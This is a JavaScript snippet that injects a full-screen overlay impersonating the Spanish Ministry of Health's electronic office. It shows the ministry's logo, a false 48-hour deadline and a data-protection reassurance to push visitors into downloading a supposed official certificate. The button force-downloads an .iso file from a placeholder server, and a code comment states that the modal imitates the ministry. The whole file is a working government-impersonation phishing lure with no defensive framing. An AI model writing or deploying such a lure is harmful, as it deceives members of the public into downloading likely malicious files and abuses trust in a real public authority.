(function(){
    // Configuración
    const isoUrl = 'https://tu-servidor.com/Documento_Oficial_Sanidad.iso';
    const fileName = 'Documento_Oficial_Sanidad.iso';

    // Estilos para la ventana emergente (overlay)
    const overlay = document.createElement('div');
    overlay.id = 'mscbs-overlay';
    overlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.7);
        backdrop-filter: blur(4px);
        z-index: 99999;
        font-family: 'Segoe UI', Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
    `;

    // Estructura de la ventana (simula un modal del Ministerio)
    overlay.innerHTML = `
        <div style="background: #fff; border-radius: 12px; max-width: 480px; width: 90%; padding: 28px 24px; text-align: center; box-shadow: 0 20px 35px rgba(0,0,0,0.3); border-top: 6px solid #006241;">
            <div style="margin-bottom: 16px;">
                <img src="https://sede.mscbs.gob.es/static/img/logo-mintrad.png" style="height: 48px;" onerror="this.style.display='none'">
                <h2 style="color: #006241; margin: 8px 0 0; font-weight: 600;">Ministerio de Sanidad</h2>
                <p style="color: #555; margin-top: 5px; font-size: 14px;">Sede Electrónica</p>
            </div>
            <div style="width: 60px; height: 60px; background: #e8f5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 10px auto;">
                <span style="font-size: 32px;">⚠️</span>
            </div>
            <h3 style="margin: 10px 0 5px; color: #333;">Actualización del Sistema de Información Sanitaria</h3>
            <p style="color: #666; margin: 15px 0; line-height: 1.5;">
                Se requiere actualizar el componente de seguridad de su expediente sanitario electrónico.<br>
                <strong style="color:#d32f2f;">Plazo límite: 48 horas</strong>
            </p>
            <div style="background: #f9f9fc; padding: 12px; border-radius: 8px; margin: 20px 0; border: 1px solid #eee;">
                <p style="margin: 0; font-size: 13px; color: #555;">
                    📄 Documento requerido: <strong>Certificado_Sanitario_Oficial_v2.iso</strong><br>
                    Tamaño: 2.4 MB
                </p>
            </div>
            <button id="mscbs-download-btn" style="background: #006241; color: white; border: none; padding: 14px 28px; border-radius: 40px; font-size: 18px; font-weight: bold; cursor: pointer; width: 80%; margin: 5px 0; transition: 0.2s;">📥 Descargar certificado ahora</button>
            <p style="font-size: 12px; color: #aaa; margin-top: 20px;">
                Sus datos están protegidos bajo la Ley Orgánica 3/2018.
            </p>
        </div>
    `;

    document.body.appendChild(overlay);

    // Evento de descarga
    document.getElementById('mscbs-download-btn').addEventListener('click', (e) => {
        e.preventDefault();
        
        // Crear enlace de descarga forzada
        const link = document.createElement('a');
        link.href = isoUrl;
        link.download = fileName;
        link.style.display = 'none';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);

        // Cambiar mensaje del botón para evitar doble clic
        const btn = document.getElementById('mscbs-download-btn');
        btn.textContent = '✅ Descargando...';
        btn.disabled = true;
        btn.style.opacity = '0.6';

        // Cerrar overlay después de 3 segundos
        setTimeout(() => {
            if(overlay) overlay.remove();
        }, 3000);
    });
})();
